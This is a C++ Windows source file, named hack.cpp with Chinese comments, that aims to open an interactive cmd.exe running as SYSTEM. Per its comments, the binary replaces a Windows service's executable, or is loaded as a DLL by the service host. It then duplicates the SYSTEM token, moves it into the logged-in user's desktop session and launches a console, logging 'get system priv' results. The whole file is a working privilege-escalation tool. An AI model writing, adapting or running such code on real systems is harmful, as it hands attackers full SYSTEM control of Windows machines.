// hack.cpp 
// SYSTEM权限弹出具有UI的cmd.exe
// exe程序只能替换服务主进程，dll的话，需要由服务主进程加载
// 子进程调用无效
//


#include "framework.h"
#include "hack.h"

#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <WtsApi32.h>
#include <Userenv.h>
#include<string>
#include<vector>
#include <Tlhelp32.h>

using namespace std;

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Userenv.lib")

#define LOAG_FILE_NAME L"1.txt"

void  WriteLogString(LPCWSTR lpParam, DWORD dwCode)
{
	TCHAR lpBuffer[1024]{ 0 };
	wsprintf(lpBuffer, lpParam, dwCode);
	FILE* pFile = NULL;
	_wfopen_s(&pFile, LOAG_FILE_NAME, TEXT("a+"));
	if (NULL == pFile)
	{
		return;
	}
	fwprintf_s(pFile, L"\r\n");
	fwprintf_s(pFile, lpBuffer); //写入到文件
	fclose(pFile);
	return;
}

BOOL GetExplorerProcessToken(DWORD* dwProcessId)
{
	HANDLE hThisProcess = NULL;
	PROCESSENTRY32 pe;
	BOOL  bMore;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);


	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	pe.dwSize = sizeof(PROCESSENTRY32);

	bMore = Process32First(hSnapshot, &pe);
	while (bMore)
	{
		if (0 == _tcsicmp(pe.szExeFile, _T("explorer.exe")))
		{
			hThisProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID);
			*dwProcessId = pe.th32ProcessID;
			return true;
		}
		bMore = Process32Next(hSnapshot, &pe);
	}
	return false;
}

bool ServerRunWndProcess(LPWSTR lpExePath)
{	
	DWORD dwSessionId;
	DWORD dwProcessId;
	HANDLE hThisProcess = NULL;
	if (!GetExplorerProcessToken(&dwProcessId))//获取桌面进程的id。
	{
		int d = GetLastError();
		WriteLogString(L"Get explorer.exe processId faild", d);
		return FALSE;
	}

	hThisProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwProcessId);
	//获取桌面进程的回话id，不然在远程桌面的情况下，消息框显示不出来。
	ProcessIdToSessionId(dwProcessId, &dwSessionId);

	if (!hThisProcess)
	{
		int d = GetLastError();
		WriteLogString(L"RunProcess GetProcessToken is NULL", d);
		return FALSE;
	}

	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess()/*hThisProcess*/, TOKEN_ALL_ACCESS, &hToken))
	{
		int d = GetLastError();
		WriteLogString(L"RunRemoteControl OpenProcessToken failed.Last Error is:%d", d);
		return false;
	}

	HANDLE hTokenDup = NULL;
	bool bRet = DuplicateTokenEx(hToken, /*TOKEN_ALL_ACCESS*/MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hTokenDup);
	if (!bRet || hTokenDup == NULL)
	{
		int d = GetLastError();
		WriteLogString(L"RunRemoteControl OpenProcessToken failed.Last Error is:%d", d);
		CloseHandle(hToken);
		return false;
	}

	//DWORD dwSessionId = WTSGetActiveConsoleSessionId();
	//把服务hToken的SessionId替换成当前活动的Session(即替换到可与用户交互的winsta0下)
	if (!SetTokenInformation(hTokenDup, TokenSessionId, &dwSessionId, sizeof(DWORD)))
	{
		int ddd = GetLastError();
		WriteLogString(L"RunRemoteControl SetTokenInformation failed.Last error is:%d", ddd);
		CloseHandle(hTokenDup);
		CloseHandle(hToken);
		return false;
	}

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));

	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (WCHAR*)_T("WinSta0\\Default");
	si.wShowWindow = SW_SHOW;
	si.dwFlags = STARTF_USESHOWWINDOW |STARTF_USESTDHANDLES;

	//创建进程环境块
	LPVOID pEnv = NULL;
	bRet = CreateEnvironmentBlock(&pEnv, hTokenDup, FALSE);
	if (!bRet)
	{
		int error1 = GetLastError();
		WriteLogString(L"RunRemoteControl CreateEnvironmentBlock failed.Last error is:%d", error1);
		CloseHandle(hTokenDup);
		CloseHandle(hToken);
		return false;
	}

	if (pEnv == NULL)
	{
		CloseHandle(hTokenDup);
		CloseHandle(hToken);
		return false;
	}

	//在活动的Session下创建进程
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
	DWORD dwCreationFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
	//DWORD dwCreationFlag = CREATE_UNICODE_ENVIRONMENT | DETACHED_PROCESS;//NORMAL_PRIORITY_CLASS| CREATE_NEW_CONSOLE;
	if (!CreateProcessAsUser(hTokenDup, NULL, lpExePath, NULL, NULL, FALSE, dwCreationFlag, pEnv, NULL, &si, &processInfo))
	{
		int error2 = GetLastError();
		WriteLogString(L"RunRemoteControl CreateProcessAsUser failed.Last error is:%d", error2);
		CloseHandle(hTokenDup);
		CloseHandle(hToken);
		return false;
	}

	DestroyEnvironmentBlock(pEnv);
	CloseHandle(hTokenDup);
	CloseHandle(hToken);

	return true;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	WriteLogString(L"Begin to start get system priv:%d", 0);
	//WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
	WCHAR cmd[] = L"cmd.exe";
	if (ServerRunWndProcess(cmd))
	{
		WriteLogString(L"Get system priv success:%d", 0);
	}else
		WriteLogString(L"Get system priv failed:%d", -1);
    //system("cmd /C whoami > whoami.txt & pause");
    return 1;
}
